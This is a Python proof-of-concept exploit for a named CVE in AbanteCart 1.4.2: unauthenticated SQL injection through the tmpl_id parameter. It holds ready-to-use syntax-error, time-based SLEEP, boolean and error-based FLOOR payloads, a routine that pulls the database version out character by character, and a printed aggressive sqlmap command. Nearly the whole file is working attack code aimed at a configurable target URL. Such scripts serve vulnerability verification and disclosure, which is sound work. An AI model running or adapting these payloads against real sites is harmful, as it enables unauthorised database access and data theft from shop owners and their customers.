#!/usr/bin/env python3
"""
CVE-2025-50972 - AbanteCart 1.4.2 SQL Injection PoC
Unauthenticated SQL injection via tmpl_id parameter in extension/generic endpoint

Reference: https://github.com/4rdr/proofs/blob/main/info/abantecart_sql_injection_1.4.2_via_template_parameter.md
"""
import requests
import sys
import time
import subprocess
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://localhost:8080"


def test_syntax_error():
    """
    Verify SQL injection by triggering a syntax error.
    Empty response indicates SQL error occurred.
    """
    print("[*] Testing SQL injection via syntax error...")
    
    url = f"{TARGET_URL}/index.php"
    
    params_clean = {
        "rt": "extension/generic",
        "layout_id": "1",
        "tmpl_id": "novator",
        "pb": "test"
    }
    
    params_inject = {
        "rt": "extension/generic",
        "layout_id": "1",
        "tmpl_id": "novator'",
        "pb": "test"
    }
    
    try:
        resp_clean = requests.get(url, params=params_clean, timeout=30, verify=False)
        resp_inject = requests.get(url, params=params_inject, timeout=30, verify=False)
        
        len_clean = len(resp_clean.text)
        len_inject = len(resp_inject.text)
        
        print(f"    Clean request response: {len_clean} bytes")
        print(f"    Injected request response: {len_inject} bytes")
        
        if len_inject == 0 and len_clean > 0:
            print("[+] SQL injection CONFIRMED! Syntax error causes empty response")
            return True
        elif len_clean != len_inject:
            print("[+] SQL injection likely - response length differs significantly")
            return True
        else:
            print("[-] No obvious difference detected")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def test_time_based_sqli():
    """
    Time-based blind SQL injection via SLEEP().
    Uses subprocess/curl for accurate timing.
    """
    print("[*] Testing time-based blind SQL injection (SLEEP)...")
    
    payload = "novator' AND SLEEP(5) AND '1'='1"
    encoded_payload = urllib.parse.quote(payload)
    url = f"{TARGET_URL}/index.php?rt=extension/generic&layout_id=1&tmpl_id={encoded_payload}&pb=test"
    
    start_time = time.time()
    try:
        result = subprocess.run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{time_total}", url],
            capture_output=True,
            text=True,
            timeout=60
        )
        elapsed = float(result.stdout) if result.stdout else time.time() - start_time
        
        print(f"    Response time: {elapsed:.2f} seconds")
        
        if elapsed >= 4.5:
            print("[+] Time-based SQLi SUCCESSFUL! SLEEP(5) executed")
            return True
        else:
            print("[-] Time-based SQLi: Response too fast")
            return False
    except subprocess.TimeoutExpired:
        print("[+] Time-based SQLi SUCCESSFUL! Request timed out")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def test_boolean_based_sqli():
    """
    Boolean-based SQL injection using AND 1=1 vs AND 1=2.
    """
    print("[*] Testing boolean-based SQL injection...")
    
    url = f"{TARGET_URL}/index.php"
    
    params_true = {
        "rt": "extension/generic",
        "layout_id": "1",
        "tmpl_id": "novator' AND 1=1 AND '1'='1",
        "pb": "test"
    }
    
    params_false = {
        "rt": "extension/generic",
        "layout_id": "1",
        "tmpl_id": "novator' AND 1=2 AND '1'='1",
        "pb": "test"
    }
    
    try:
        resp_true = requests.get(url, params=params_true, timeout=30, verify=False)
        resp_false = requests.get(url, params=params_false, timeout=30, verify=False)
        
        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        
        print(f"    True condition (1=1): {len_true} bytes")
        print(f"    False condition (1=2): {len_false} bytes")
        
        if len_true > 0 and len_false == 0:
            print("[+] Boolean-based SQLi SUCCESSFUL! False condition causes empty response")
            return True
        elif len_true != len_false:
            print("[+] Boolean-based SQLi SUCCESSFUL! Response differs based on condition")
            return True
        else:
            print("[-] Boolean-based SQLi: Responses are identical")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def test_error_based_sqli():
    """
    Error-based SQL injection using FLOOR-based payload.
    """
    print("[*] Testing error-based SQL injection (FLOOR)...")
    
    payload = "novator' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '1'='1"
    url = f"{TARGET_URL}/index.php"
    params = {
        "rt": "extension/generic",
        "layout_id": "1",
        "tmpl_id": payload,
        "pb": "test"
    }
    
    try:
        resp = requests.get(url, params=params, timeout=30, verify=False)
        
        if "Duplicate entry" in resp.text:
            import re
            match = re.search(r"Duplicate entry '~(.+?)~", resp.text)
            if match:
                print(f"[+] Error-based SQLi SUCCESSFUL! Extracted: {match.group(1)}")
                return True
            print("[+] Error-based SQLi: Duplicate entry error detected")
            return True
        
        print(f"[-] Error-based SQLi: Response length {len(resp.text)} bytes")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def extract_version_time_based():
    """
    Extract database version via time-based blind injection.
    """
    print("[*] Extracting database version via time-based blind injection...")
    
    extracted = ""
    for pos in range(1, 15):
        found = False
        for char in "0123456789.-":
            payload = f"novator' AND IF(SUBSTRING(VERSION(),{pos},1)='{char}',SLEEP(2),0) AND '1'='1"
            encoded_payload = urllib.parse.quote(payload)
            url = f"{TARGET_URL}/index.php?rt=extension/generic&layout_id=1&tmpl_id={encoded_payload}&pb=test"
            
            start = time.time()
            try:
                subprocess.run(
                    ["curl", "-s", "-o", "/dev/null", url],
                    timeout=5,
                    capture_output=True
                )
                elapsed = time.time() - start
            except subprocess.TimeoutExpired:
                elapsed = 5
            
            if elapsed >= 1.8:
                extracted += char
                print(f"    Position {pos}: '{char}' (version so far: {extracted})")
                found = True
                break
        
        if not found:
            break
    
    if extracted:
        print(f"[+] Extracted database version: {extracted}")
        return extracted
    return None


def main():
    print("=" * 70)
    print("CVE-2025-50972 - AbanteCart 1.4.2 SQL Injection PoC")
    print("=" * 70)
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Vulnerable endpoint: /index.php?rt=extension/generic")
    print(f"[*] Vulnerable parameter: tmpl_id")
    print()
    
    results = []
    
    results.append(("Syntax error test", test_syntax_error()))
    print()
    
    results.append(("Time-based SQLi (SLEEP)", test_time_based_sqli()))
    print()
    
    results.append(("Boolean-based SQLi", test_boolean_based_sqli()))
    print()
    
    results.append(("Error-based SQLi (FLOOR)", test_error_based_sqli()))
    print()
    
    success_count = sum(1 for _, r in results if r)
    
    if success_count >= 2:
        print("[*] Attempting data extraction...")
        version = extract_version_time_based()
        if version:
            results.append(("Data extraction", True))
    print()
    
    print("=" * 70)
    print("Summary:")
    print("=" * 70)
    for name, result in results:
        status = "VULNERABLE" if result else "NOT CONFIRMED"
        print(f"  {name}: {status}")
    
    print()
    success_count = sum(1 for _, r in results if r)
    if success_count > 0:
        print(f"[+] EXPLOIT SUCCESSFUL - {success_count}/{len(results)} techniques confirmed")
        print()
        print("[*] Vulnerability Details:")
        print("    - Endpoint: /index.php?rt=extension/generic")
        print("    - Parameter: tmpl_id")
        print("    - Type: Unauthenticated SQL Injection")
        print("    - Attack vector: Network")
        print("    - Impact: Database read/write, data exfiltration, DoS")
        print()
        print("[*] Recommended sqlmap command:")
        print(f'    sqlmap -u "{TARGET_URL}/index.php?rt=extension/generic&layout_id=1&tmpl_id=novator*&pb=test" --dbms mysql --level 5 --risk 3')
        return 0
    else:
        print("[-] EXPLOIT FAILED - No SQL injection techniques confirmed")
        print("[*] Note: Ensure Page Builder extension is enabled")
        return 1


if __name__ == "__main__":
    sys.exit(main())
